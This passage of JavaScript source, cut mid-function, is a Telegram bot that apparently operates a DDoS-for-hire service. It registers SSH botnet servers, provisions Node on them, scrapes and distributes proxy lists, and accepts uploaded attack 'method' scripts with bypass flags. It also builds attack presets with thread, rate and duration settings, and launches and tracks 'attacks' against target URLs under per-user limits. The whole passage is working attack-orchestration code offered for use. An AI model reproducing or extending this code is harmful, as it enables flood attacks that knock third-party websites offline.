      pendingInput.set(userId, { action: 'preset_name', data: {}, expires: Date.now() + 180000 });
      await answerCB(q.id, '🎯');
      return bot.sendMessage(chatId, `🎯 <b>New Preset</b>\n\nStep 1/3 — Preset name (2-20 chars):`,
        { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }

    if (data === 'adm_servers') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showAdminServers(chatId, msgId);
    }
    if (data === 'syncall_methods') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '🔄', true);
      const servers = store.servers.get().filter(s => s.status === 'online');
      if (!servers.length) return answerCB(q.id, '📭', true);
      let ok = 0;
      await Promise.allSettled(servers.map(async s => {
        try {
          for (const m of allMethods()) remoteHashCache.delete(`${s.id}:${m.file}`);
          remoteDepsCache.delete(s.id);
          await syncMethodToServer(s.id, null);
          ok++;
        } catch {}
      }));
      await answerCB(q.id, `${ok}/${servers.length}`, true);
      return showAdminServers(chatId, msgId);
    }
    if (data === 'provision_all') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '⚡ Provisioning all…', true);
      const servers = store.servers.get();
      let ok = 0;
      await Promise.allSettled(servers.map(async s => {
        try {
          const conn = await getServerConn(s.id);
          await provisionRemote(s.id, conn);
          ok++;
        } catch {}
      }));
      await answerCB(q.id, `${ok}/${servers.length} ready`, true);
      return showAdminServers(chatId, msgId);
    }
    if (data === 'deps_all') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '📦 Installing deps…', true);
      const servers = store.servers.get().filter(s => s.status === 'online');
      let ok = 0;
      const failed = [];
      await Promise.allSettled(servers.map(async s => {
        try {
          const conn = await getServerConn(s.id);
          const env = remoteEnvCache.get(s.id) || await collectRemoteEnv(s.id, conn);
          if (!env?.nodePath) { failed.push(s.name); return; }
          remoteDepsCache.delete(s.id);
          await ensureDepsOnRemote(conn, s.id, env);
          ok++;
        } catch { failed.push(s.name); }
      }));
      const extra = failed.length ? ` · ❌ ${failed.slice(0,3).join(',')}` : '';
      await answerCB(q.id, `✅ ${ok}/${servers.length}${extra}`, true);
      return showAdminServers(chatId, msgId);
    }
    if (data.startsWith('srv_') && !/^srv_(sync_|del_|health_|group_|diag_|provision_|deps_)/.test(data)) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showServerActions(chatId, msgId, data.slice(4));
    }
    if (data.startsWith('srv_del_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      removeServer(data.slice(8));
      await answerCB(q.id, '❌', true);
      return showAdminServers(chatId, msgId);
    }
    if (data.startsWith('srv_sync_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(9);
      await answerCB(q.id, '🔄', true);
      try {
        for (const m of allMethods()) remoteHashCache.delete(`${id}:${m.file}`);
        remoteDepsCache.delete(id);
        await syncMethodToServer(id, null);
      } catch {}
      return showServerActions(chatId, msgId, id);
    }
    if (data.startsWith('srv_provision_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(14);
      await answerCB(q.id, '⚡ provisioning…', true);
      try {
        const conn = await getServerConn(id);
        await provisionRemote(id, conn, (m) => bot.sendMessage(chatId, `⚡ ${esc(getServer(id)?.name || id)}: ${esc(m)}`).catch(() => {}));
        const env = remoteEnvCache.get(id);
        await answerCB(q.id, env?.nodePath ? `✅ node ${env.version}` : '✅ done', true);
      } catch (e) {
        await answerCB(q.id, '❌ ' + e.message.slice(0, 100), true);
      }
      return showServerActions(chatId, msgId, id);
    }
    if (data.startsWith('srv_deps_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(9);
      await answerCB(q.id, '📦 installing deps…', true);
      try {
        const conn = await getServerConn(id);
        const env = remoteEnvCache.get(id) || await collectRemoteEnv(id, conn);
        if (!env?.nodePath) throw new Error('node not installed');
        remoteDepsCache.delete(id);
        const r = await ensureDepsOnRemote(conn, id, env, (m) => bot.sendMessage(chatId, `📦 ${esc(getServer(id)?.name || id)}: ${esc(m)}`).catch(() => {}));
        await answerCB(q.id, r.installed ? '✅ installed' : '✅ already present', true);
      } catch (e) {
        await answerCB(q.id, '❌ ' + e.message.slice(0, 100), true);
      }
      return showServerActions(chatId, msgId, id);
    }
    if (data.startsWith('srv_health_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(11);
      await answerCB(q.id, '🔍', true);
      healthCache.delete(id);
      remoteEnvCache.delete(id);
      const r = await checkServerHealth(id, true);
      const env = r.env;
      const msg = r.online
        ? `🟢 ${env ? hardwareBadge(env) : ''}${env?.version ? ` · node ${env.version}` : ''}`
        : `🔴 ${r.error || 'offline'}`;
      await answerCB(q.id, msg, true);
      return showServerActions(chatId, msgId, id);
    }
    if (data.startsWith('srv_diag_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(9);
      await answerCB(q.id, '🧪', true);
      try {
        const conn = await getServerConn(id);
        const r = await sshExec(conn,
          `echo "=== UPTIME ==="; uptime; ` +
          `echo "=== CORES ==="; nproc; ` +
          `echo "=== MEMORY ==="; free -m; ` +
          `echo "=== DISK ==="; df -h /; ` +
          `echo "=== NODE ==="; bash -lc 'command -v node; node -v' 2>&1; ` +
          `echo "=== REMOTE_DIR ==="; ls -la ${CONFIG.REMOTE_DIR} 2>&1 | head -30; ` +
          `echo "=== DEPS ==="; ls ${CONFIG.REMOTE_DIR}/node_modules 2>/dev/null | head -30 || echo "no node_modules"; ` +
          `echo "=== RUNNING ==="; pgrep -af 'node .*\\.js' 2>&1 | head -10`,
          15000);
        return edit(chatId, msgId,
          `🧪 <b>Diag — ${esc(getServer(id)?.name || id)}</b>\n\n<pre>${esc((r.out || '').slice(0, 3500))}</pre>`,
          { reply_markup: { inline_keyboard: [[btn('⬅️ Back', `srv_${id}`, 'primary')]] } });
      } catch (e) {
        return answerCB(q.id, '❌ ' + e.message, true);
      }
    }
    if (data.startsWith('srv_group_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(10);
      pendingInput.set(userId, { action: 'set_group', data: { serverId: id }, expires: Date.now() + 60000 });
      await answerCB(q.id, '🏷');
      return bot.sendMessage(chatId, `🏷 Send group name (or "-" to clear):`, { reply_markup: { force_reply: true, selective: true } });
    }
    if (data === 'addsrv_start') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'as_addr', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, '🔌');
      return bot.sendMessage(chatId, `🔌 <b>Add Server</b>\n\nStep 1/3 — Send <code>IP:PORT</code>`,
        { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }

    if (data === 'adm_proxies') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showAdminProxies(chatId, msgId);
    }
    if (data === 'proxy_upload') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'proxy_file', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, '📁');
      return bot.sendMessage(chatId, `📁 Send <code>.txt</code>`, { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }
    if (data === 'proxy_scrape') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '🔄', true);
      const n = await scrapeProxies();
      await answerCB(q.id, `+${n} · ${readProxies().length}`, true);
      return showAdminProxies(chatId, msgId);
    }
    if (data === 'proxy_health') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '🧪', true);
      const r = await scoreProxies(50);
      await answerCB(q.id, `🟢 ${r.alive} · 🔴 ${r.dead} · total ${r.total}`, true);
      return showAdminProxies(chatId, msgId);
    }
    if (data === 'proxy_syncall') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '📤', true);
      const servers = store.servers.get().filter(s => s.status === 'online');
      let ok = 0;
      await Promise.allSettled(servers.map(async s => {
        try {
          const conn = await getServerConn(s.id);
          if (fs.existsSync(FILES.proxies)) await sshUpload(conn, FILES.proxies, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
          ok++;
        } catch {}
      }));
      await answerCB(q.id, `${ok}/${servers.length}`, true);
      return showAdminProxies(chatId, msgId);
    }
    if (data === 'proxy_clear') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      saveProxies([]);
      await answerCB(q.id, '🗑', true);
      return showAdminProxies(chatId, msgId);
    }

    if (data === 'adm_blacklist') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const list = store.blacklist.get();
      const txt = list.length ? '🚫 <b>Blacklist:</b>\n' + list.map(h => `• <code>${esc(h)}</code>`).join('\n') : '📭 Empty';
      await answerCB(q.id, '🚫');
      return edit(chatId, msgId, txt, { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
    }
    if (data === 'adm_stats') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const users = Object.values(store.users.get());
      const s = serverStats();
      const hist = store.history.get();
      const methods = allMethods();
      const owners = CONFIG.ADMIN_IDS.length;
      const admins = users.filter(u => u.role === 'admin' && !isOwner(u.telegramId)).length;
      const txt = [
        '📊 <b>Global Stats</b>', '',
        `🏛 Bot: ${botIsOnline() ? '🟢 ONLINE' : '🔴 MAINTENANCE'}`,
        `👥 Users: ${users.length} (${owners}👑 · ${admins}🛡)`,
        `📡 Servers: ${s.online}/${s.total}`,
        `⚔️ Sessions: ${Object.values(store.sessions.get()).filter(x => x.status === 'running').length}`,
        `💥 Methods: ${methods.filter(m => m.enabled).length}/${methods.length}`,
        `🎯 Presets: ${Object.keys(store.presets.get()).length}`,
        `🌐 Proxies: ${readProxies().length}`,
        `📜 Total attacks: ${hist.length}`,
        `⏱ Last 24h: ${hist.filter(h => Date.now() - h.at < 86400000).length}`,
      ].join('\n');
      await answerCB(q.id, '📊');
      return edit(chatId, msgId, txt, { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
    }
    if (data === 'adm_audit') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '📜');
      return showAudit(chatId, msgId);
    }
    if (data === 'adm_broadcast') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'broadcast_msg', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, '📢');
      return bot.sendMessage(chatId, `📢 Send broadcast message:`, { reply_markup: { force_reply: true, selective: true } });
    }
    if (data === 'adm_refresh') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '🔄');
      const servers = store.servers.get();
      if (!servers.length) return edit(chatId, msgId, '📭 No servers', { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
      let online = 0, done = 0;
      await Promise.all(servers.map(async s => {
        healthCache.delete(s.id);
        remoteEnvCache.delete(s.id);
        remoteDepsCache.delete(s.id);
        const r = await checkServerHealth(s.id, true);
        if (r.online) online++;
        done++;
        edit(chatId, msgId, `🔄 ${done}/${servers.length} · 🟢 ${online}`).catch(() => {});
      }));
      return edit(chatId, msgId,
        `✅ Done\n🟢 ${online} · 🔴 ${servers.length - online}`,
        { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
    }
    if (data === 'adm_killall') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const n = stopAllSessions(null);
      await answerCB(q.id, n ? `💀 ${n}` : '📭', true);
      return showAdminPanel(chatId, msgId, userId);
    }

    await answerCB(q.id, '⚠️ Unknown');
  } catch (e) {
    console.error('[callback]', e);
    try { await answerCB(q.id, '❌ ' + e.message, true); } catch {}
  }
});

/* ══════════════════════════════════════════════════════════════════════════
   PENDING INPUT ROUTER
   ══════════════════════════════════════════════════════════════════════════ */

bot.on('message', async msg => {
  if (!msg.text && !msg.document) return;
  const text = msg.text ? msg.text.trim() : '';

  if (!botIsOnline() && !isAdmin(msg.from.id)) {
    if (text === '/cancel') {
      pendingInput.delete(msg.from.id);
      return reply(msg, '❎ Cancelled');
    }
    return sendMaintenance(msg);
  }

  if (text.startsWith('/')) {
    if (text === '/cancel') { pendingInput.delete(msg.from.id); return reply(msg, '❎ Cancelled'); }
    return;
  }

  const pending = pendingInput.get(msg.from.id);
  if (!pending || (pending.expires && Date.now() > pending.expires)) return;

  const user = ensureUser(msg);
  const data = pending.data || {};

  if (pending.action === 'botctl_msg') {
    if (!isAdmin(msg.from.id)) { pendingInput.delete(msg.from.id); return; }
    pendingInput.delete(msg.from.id);
    store.botstate.mutate(s => { s.maintenanceMsg = text; s.lastToggleBy = msg.from.id; });
    audit('bot_msg_changed', msg.from.id, { msg: text.slice(0, 100) });
    await reply(msg, `✅ Message updated:\n\n<i>${esc(text)}</i>`);
    return showBotControl(msg.chat.id);
  }

  if (pending.action === 'broadcast_msg') {
    if (!isAdmin(msg.from.id)) { pendingInput.delete(msg.from.id); return; }
    pendingInput.delete(msg.from.id);
    const users = Object.values(store.users.get()).filter(u => u.role === 'admin' || u.role === 'user');
    let ok = 0, fail = 0;
    for (const u of users) {
      try { await bot.sendMessage(u.telegramId, `📢 <b>${BRAND}</b>\n\n${esc(text)}`, { parse_mode: 'HTML' }); ok++; }
      catch { fail++; }
      await new Promise(r => setTimeout(r, 50));
    }
    return reply(msg, `✅ Sent: ${ok} · ❌ Failed: ${fail}`);
  }

  if (pending.action === 'preset_name') {
    if (!/^[a-zA-Z0-9_-]{2,20}$/.test(text)) return reply(msg, '❌ 2-20 chars a-z0-9_-');
    if (store.presets.get()[text]) return reply(msg, '❌ Name exists');
    data.name = text;
    pending.action = 'preset_method';
    pendingInput.set(msg.from.id, pending);
    const methods = allMethods().map(m => `<code>${m.id}</code>`).join(', ');
    return reply(msg, `✅ Name: <code>${text}</code>\n\nStep 2/3 — Method ID.\nAvailable: ${methods}`);
  }
  if (pending.action === 'preset_method') {
    if (!getMethod(text)) return reply(msg, '❌ Unknown method');
    data.method = text;
    pending.action = 'preset_threads';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, `✅ Method: <b>${text}</b>\n\nStep 3/3 — Threads and rate (e.g. <code>16 90</code>):`);
  }
  if (pending.action === 'preset_threads') {
    const parts = text.split(/\s+/);
    const threads = parseInt(parts[0], 10);
    const rate = parseInt(parts[1], 10);
    if (!threads || !rate) return reply(msg, '❌ Format: <code>16 90</code>');
    store.presets.mutate(p => {
      p[data.name] = { method: data.method, threads, rate, duration: 60 };
    });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Preset <code>@${data.name}</code> created.\n\nUsage: <code>/attack @${data.name} https://example.com 60</code>`);
    return showAdminPresets(msg.chat.id);
  }

  if (pending.action === 'set_group') {
    if (!isAdmin(msg.from.id)) { pendingInput.delete(msg.from.id); return; }
    const sId = data.serverId;
    const val = text === '-' ? null : text;
    upsertServer({ id: sId, group: val });
    if (val) store.groups.mutate(g => { if (!g.includes(val)) g.push(val); });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Group ${val ? `<code>${esc(val)}</code>` : 'cleared'}`);
    return showServerActions(msg.chat.id, null, sId);
  }

  if (pending.action === 'proxy_file') {
    if (!msg.document) return reply(msg, '❌ Send a .txt file');
    const fn = msg.document.file_name || 'p.txt';
    if (!fn.endsWith('.txt')) return reply(msg, '❌ Must be .txt');
    try {
      const link = await bot.getFileLink(msg.document.file_id);
      const r = await axios.get(link, { responseType: 'text', timeout: 30000 });
      const lines = String(r.data).split(/\r?\n/).map(l => l.trim()).filter(l => /^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(l));
      const combined = [...new Set([...readProxies(), ...lines])];
      saveProxies(combined);
      pendingInput.delete(msg.from.id);
      await reply(msg, `✅ +${lines.length} · Total ${combined.length}`);
      return showAdminProxies(msg.chat.id);
    } catch (e) { pendingInput.delete(msg.from.id); return reply(msg, `❌ ${esc(e.message)}`); }
  }

  if (pending.action === 'am_file') {
    if (!msg.document) return reply(msg, '❌ Send a .js file');
    const fn = msg.document.file_name || 'method.js';
    if (!fn.endsWith('.js')) return reply(msg, '❌ Must be .js');
    try {
      const link = await bot.getFileLink(msg.document.file_id);
      const tp = path.join(CONFIG.SCRIPT_DIR, fn);
      const r = await axios.get(link, { responseType: 'stream', timeout: 30000 });
      await new Promise((res, rej) => {
        const w = fs.createWriteStream(tp);
        r.data.pipe(w);
        w.on('finish', res);
        w.on('error', rej);
      });
      const check = await validateMethodFile(fn);
      if (!check.ok) return reply(msg, `❌ Syntax: ${esc(check.error)}`);
      data.fileName = fn;
      pending.action = 'am_id';
      pendingInput.set(msg.from.id, pending);
      return reply(msg, `✅ <code>${fn}</code>.\n\nStep 2/4 — Method ID (2-20 chars, a-z0-9_-):`);
    } catch (e) { pendingInput.delete(msg.from.id); return reply(msg, `❌ ${esc(e.message)}`); }
  }

  if (pending.action === 'am_id') {
    if (!/^[a-zA-Z0-9_-]{2,20}$/.test(text)) return reply(msg, '❌ 2-20 chars a-z0-9_-');
    if (allMethods().some(m => m.id === text.toLowerCase())) return reply(msg, '❌ ID exists');
    data.methodId = text.toLowerCase();
    pending.action = 'am_sample';
    pendingInput.set(msg.from.id, pending);
    return reply(msg,
      `✅ ID <code>${data.methodId}</code>\n\nStep 3/4 — Sample command:\n` +
      `<code>node ${data.fileName} https://example.com 1200 proxy.txt 8 8000 -bypass --origin</code>`);
  }

  if (pending.action === 'am_sample') {
    const result = parseSampleCommand(text);
    if (!result.ok) return reply(msg, `❌ ${esc(result.error)}`);
    data.template = result.template;
    data.sampleCmd = text;
    data.warnings = result.warnings;
    pending.action = 'am_confirm';
    pendingInput.set(msg.from.id, pending);
    let preview = '';
    try {
      const args = buildArgsFromTemplate(result.template, 'https://example.com', '60', '16', '90');
      preview = `node ${data.fileName} ${args.map(a => /\s/.test(a) ? `"${a}"` : a).join(' ')}`;
    } catch {}
    const txt = [
      `✅ <b>Sample parsed</b>`, ``,
      `Template:`, `<code>${esc(result.template)}</code>`, ``,
      `<i>$1=target · $2=duration · $3=threads · $4=rate · {proxy}=proxy.txt</i>`, ``,
      `Will run:`, `<code>${esc(preview)}</code>`,
    ];
    if (result.warnings.length) { txt.push(''); result.warnings.forEach(w => txt.push(`⚠️ ${esc(w)}`)); }
    txt.push('', '<b>Save?</b>');
    return bot.sendMessage(msg.chat.id, txt.join('\n'), {
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [
        [btn('✅ Save & Sync', 'addmethod_save', 'success')],
        [btn('❌ Cancel', 'addmethod_cancel', 'danger')],
      ]},
    });
  }

  // NEW FLOW: quick_target (has methodId)
  if (pending.action === 'quick_target') {
    if (!/^https?:\/\//i.test(text)) return reply(msg, '❌ URL must start http(s)://');
    try { validateTarget(text); } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }
    pending.action = 'quick_duration';
    data.target = text;
    pendingInput.set(msg.from.id, pending);
    return reply(msg,
      `<b>Step 2/3</b> — Duration in seconds:\n` +
      `<i>e.g. 60 · 120 · 300 · max 3600</i>`,
      { parse_mode: 'HTML' });
  }
  if (pending.action === 'quick_duration') {
    const dur = parseInt(text, 10);
    if (!dur || dur < 1 || dur > 3600) return reply(msg, '❌ 1-3600');
    const { methodId, target } = data;
    pendingInput.delete(msg.from.id);
    const method = getMethod(methodId);
    if (!method) return reply(msg, '❌ Method gone');
    if (!isMethodEnabled(method.id)) return reply(msg, '🔴 Disabled');
    if (!userCanUseMethod(user, method.id)) return reply(msg, '🔒 No access');

    const cd = getCooldownLeft(msg.from.id);
    if (cd > 0) return reply(msg, `⏳ ${cd}s`);

    const conc = user.limits?.maxConcurrent || 0;
    if (conc > 0 && userActiveCount(msg.from.id) >= conc) return reply(msg, `❌ Max concurrent (${conc})`);

    try {
      checkUserLimits(user, dur, 0, 0);
      if (isBlacklisted(normalizeHost(target))) throw new Error('host blacklisted');
    } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }

    return showIntensityMenu(msg.chat.id, user.telegramId, methodId, target, String(dur));
  }

  if (pending.action === 'as_addr') {
    if (!/^[\w.-]+:\d+$/.test(text)) return reply(msg, '❌ ip:port');
    data.addr = text;
    pending.action = 'as_user';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, '👤 SSH username:');
  }
  if (pending.action === 'as_user') {
    data.username = text;
    pending.action = 'as_pass';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, '🔑 SSH password:');
  }
  if (pending.action === 'as_pass') {
    data.password = text;
    pending.action = 'as_name';
    pendingInput.set(msg.from.id, pending);
    try { await bot.deleteMessage(msg.chat.id, msg.message_id); } catch {}
    return reply(msg, '🏷 Server name:');
  }
  if (pending.action === 'as_name') {
    pendingInput.delete(msg.from.id);
    const [host, portStr] = data.addr.split(':');
    const port = parseInt(portStr, 10);
    const id = newServerId();
    const sm = await reply(msg, '🔄 Testing SSH…');
    const server = {
      id, host, port,
      username: data.username, password: data.password, name: text,
      status: 'testing',
      addedBy: msg.from.id,
      addedAt: new Date().toISOString(),
    };
    try {
      const conn = await sshConnect(server);
      await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 8000);
      let env = null;
      try {
        env = await collectRemoteEnv(id, conn);
        if (!env.nodePath && CONFIG.AUTO_PROVISION) {
          await edit(msg.chat.id, sm.message_id, `⚡ node missing — installing on <b>${esc(text)}</b>…`);
          env = await provisionRemote(id, conn, (m) => edit(msg.chat.id, sm.message_id, `⚡ ${esc(text)}: ${esc(m)}`).catch(() => {}));
        } else if (env.nodePath) {
          try {
            await edit(msg.chat.id, sm.message_id, `📦 installing deps on <b>${esc(text)}</b>…`);
            await ensureDepsOnRemote(conn, id, env, (m) => edit(msg.chat.id, sm.message_id, `📦 ${esc(text)}: ${esc(m)}`).catch(() => {}));
          } catch (e) { console.error('[addserver deps]', e.message); }
        }
      } catch (e) {
        console.error('[addserver provision]', e.message);
      }
      conn.end();
      upsertServer({ ...server, status: 'online', lastCheck: Date.now() });
      const hw = env ? hardwareBadge(env) : '';
      const nodeLine = env?.nodePath
        ? `\nNode: <code>${esc(env.nodePath)}</code> v${esc(env.version || '?')}`
        : `\n⚠️ <i>node not installed — use ⚡ Provision</i>`;
      const depsLine = env?.nodePath ? `\nDeps: ${remoteDepsCache.get(id)?.ok ? '✅' : '⚠️'}` : '';
      await edit(msg.chat.id, sm.message_id,
        `✅ <b>Added</b> ${esc(text)}\n<code>${host}:${port}</code>${hw ? `\nHW: <b>${hw}</b>` : ''}${nodeLine}${depsLine}\n<i>by ${msg.from.id}</i>`);
    } catch (e) {
      await edit(msg.chat.id, sm.message_id, `❌ SSH failed: <code>${esc(e.message.slice(0, 100))}</code>`);
    }
    return;
  }

  if (pending.action === 'set_dur') {
    const v = parseInt(text, 10);
    if (isNaN(v) || v < 0) return reply(msg, '❌ number, 0=∞');
    const u = getUser(data.targetId);
    if (!u) return reply(msg, '❌ user gone');
    upsertUser(data.targetId, { limits: { ...(u.limits || {}), maxDuration: v } });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Dur: ${v || '∞'}`);
    return showUserActions(msg.chat.id, null, data.targetId, msg.from.id);
  }
  if (pending.action === 'set_conc') {
    const v = parseInt(text, 10);
    if (isNaN(v) || v < 0) return reply(msg, '❌ number, 0=∞');
    const u = getUser(data.targetId);
    if (!u) return reply(msg, '❌ user gone');
    upsertUser(data.targetId, { limits: { ...(u.limits || {}), maxConcurrent: v } });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Conc: ${v || '∞'}`);
    return showUserActions(msg.chat.id, null, data.targetId, msg.from.id);
  }
});

/* ══════════════════════════════════════════════════════════════════════════
   STARTUP + RECOVERY
   ══════════════════════════════════════════════════════════════════════════ */

(async () => {
  console.log(`[bot] starting ${BRAND} ${VERSION}`);
  console.log('[bot] dir:', CONFIG.SCRIPT_DIR);
  console.log('[bot] owners:', CONFIG.ADMIN_IDS);

  const all = allMethods();
  const present = all.filter(m => fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));
  console.log('[bot] methods declared:', all.length);
  console.log('[bot] methods present:', present.map(m => `${m.emoji}${m.id}`).join(' ') || '(none)');
  const missing = all.filter(m => !fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));
  if (missing.length) console.log('[bot] methods missing:', missing.map(m => `${m.id}(${m.file})`).join(', '));

  console.log('[bot] state:', botIsOnline() ? 'ONLINE' : 'MAINTENANCE');
  console.log('[bot] auto-provision:', CONFIG.AUTO_PROVISION ? 'ON' : 'OFF');
  console.log('[bot] remote deps:', REMOTE_DEPS.length, 'pkgs');

  for (const id of CONFIG.ADMIN_IDS) {
    const u = getUser(id);
    if (!u) {
      upsertUser(id, {
        telegramId: id, role: 'admin', isOwner: true,
        createdAt: new Date().toISOString(),
        limits: { ...ADMIN_LIMITS },
        allowedMethods: null,
      });
      console.log(`[bot] owner ${id} bootstrapped`);
    } else if (u.role !== 'admin') {
      upsertUser(id, { role: 'admin', limits: { ...ADMIN_LIMITS } });
      console.log(`[bot] owner ${id} role restored`);
    }
  }

  try {
    const me = await bot.getMe();
    console.log(`[bot] @${me.username} ready`);
  } catch (e) { console.error('[bot] getMe:', e.message); }

  const servers = store.servers.get();
  if (servers.length) {
    prewarmServers(servers.map(s => s.id)).then(() => {
      const online = servers.filter(s => serverConns.has(s.id)).length;
      console.log(`[bot] ${online}/${servers.length} servers connected`);
    });
  }

  if (!fs.existsSync(FILES.proxies) || readProxies().length === 0) {
    console.log('[bot] scraping proxies…');
    try { console.log(`[bot] ${await scrapeProxies()} proxies`); } catch {}
  }

  const running = Object.values(store.sessions.get()).filter(s => s.status === 'running');
  if (running.length > 0) {
    if (CONFIG.RESUME_ON_START) {
      store.sessions.mutate(all => {
        for (const s of Object.values(all)) if (s.status === 'running') { s.status = 'stale'; s.staleAt = Date.now(); }
      });
    } else {
      stopAllSessions(null);
    }
  }
})();

/* ══════════════════════════════════════════════════════════════════════════
   SHUTDOWN
   ══════════════════════════════════════════════════════════════════════════ */

function shutdown(sig) {
  console.log(`\n[bot] ${sig} received`);
  for (const st of Object.values(store)) st.flush?.();
  setTimeout(() => process.exit(0), 500);
}
process.on('SIGINT', () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('uncaughtException', e => console.error('[uncaught]', e));
process.on('unhandledRejection', e => console.error('[rejection]', e));